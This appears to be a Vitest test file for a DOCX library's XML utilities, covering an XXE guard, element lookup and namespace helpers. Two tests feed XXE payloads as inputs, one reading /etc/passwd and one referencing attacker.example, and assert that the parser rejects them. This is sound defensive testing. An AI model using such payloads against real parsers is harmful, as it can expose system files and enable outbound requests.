/**
 * Tests for xml-utils — the XXE guard and namespace helpers.
 *
 * Coverage:
 * - parseXmlSafely rejects general entity declarations
 * - parseXmlSafely rejects parameter entity declarations
 * - parseXmlSafely allows ordinary OOXML (no entities)
 * - parseXmlSafely wraps low-level XML errors in MalformedDocxError
 * - findElements returns a non-live array
 * - ensureNamespaceOnRoot is idempotent
 */

import { describe, expect, it } from "vitest";
import {
  W14_NS,
  W_NS,
  ensureNamespaceOnRoot,
  findElements,
  parseXmlSafely,
  serializeXml,
} from "../../src/docx/xml-utils.js";
import { MalformedDocxError, XxeDetectedError } from "../../src/errors.js";

describe("parseXmlSafely XXE guard", () => {
  it("rejects general entity declarations", () => {
    const xml = `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>`;
    expect(() => parseXmlSafely(xml, "test.xml")).toThrow(XxeDetectedError);
  });

  it("rejects parameter entity declarations", () => {
    const xml = `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % evil SYSTEM "http://attacker.example/">]>
<foo/>`;
    expect(() => parseXmlSafely(xml, "test.xml")).toThrow(XxeDetectedError);
  });

  it("allows ordinary OOXML with no entity declarations", () => {
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="${W_NS}">
  <w:body>
    <w:p><w:r><w:t>Plain text</w:t></w:r></w:p>
  </w:body>
</w:document>`;
    const doc = parseXmlSafely(xml, "test.xml");
    expect(doc.documentElement?.localName).toBe("document");
  });

  it("wraps low-level XML errors in MalformedDocxError", () => {
    expect(() => parseXmlSafely("<not><closed>", "test.xml")).toThrow(MalformedDocxError);
  });
});

describe("findElements", () => {
  it("returns paragraphs in document order", () => {
    const xml = `<?xml version="1.0"?>
<w:document xmlns:w="${W_NS}">
  <w:body>
    <w:p><w:r><w:t>A</w:t></w:r></w:p>
    <w:p><w:r><w:t>B</w:t></w:r></w:p>
  </w:body>
</w:document>`;
    const doc = parseXmlSafely(xml, "test.xml");
    const paras = findElements(doc, W_NS, "p");
    expect(paras.length).toBe(2);
    expect(paras[0]?.textContent?.trim()).toBe("A");
    expect(paras[1]?.textContent?.trim()).toBe("B");
  });

  it("returns an empty array when no matches", () => {
    const xml = `<root xmlns="${W_NS}"><child/></root>`;
    const doc = parseXmlSafely(xml, "test.xml");
    expect(findElements(doc, W_NS, "p")).toEqual([]);
  });

  it("returned array is detached from the live collection", () => {
    const xml = `<?xml version="1.0"?>
<w:document xmlns:w="${W_NS}">
  <w:body>
    <w:p><w:r><w:t>A</w:t></w:r></w:p>
  </w:body>
</w:document>`;
    const doc = parseXmlSafely(xml, "test.xml");
    const first = findElements(doc, W_NS, "p");
    // Remove paragraph from doc — our snapshot still has length 1.
    first[0]?.parentNode?.removeChild(first[0]);
    expect(first.length).toBe(1);
    // Fresh query reflects the change.
    expect(findElements(doc, W_NS, "p").length).toBe(0);
  });
});

describe("ensureNamespaceOnRoot", () => {
  it("adds the declaration when missing", () => {
    const xml = `<w:document xmlns:w="${W_NS}"><w:body/></w:document>`;
    const doc = parseXmlSafely(xml, "test.xml");
    expect(doc.documentElement?.getAttribute("xmlns:w14")).toBeFalsy();
    ensureNamespaceOnRoot(doc, "w14", W14_NS);
    expect(doc.documentElement?.getAttribute("xmlns:w14")).toBe(W14_NS);
  });

  it("is idempotent", () => {
    const xml = `<w:document xmlns:w="${W_NS}" xmlns:w14="${W14_NS}"><w:body/></w:document>`;
    const doc = parseXmlSafely(xml, "test.xml");
    ensureNamespaceOnRoot(doc, "w14", W14_NS);
    ensureNamespaceOnRoot(doc, "w14", W14_NS);
    const serialised = serializeXml(doc);
    // Only one xmlns:w14 attribute should appear in the serialised output.
    const matches = serialised.match(/xmlns:w14=/g);
    expect(matches?.length).toBe(1);
  });
});
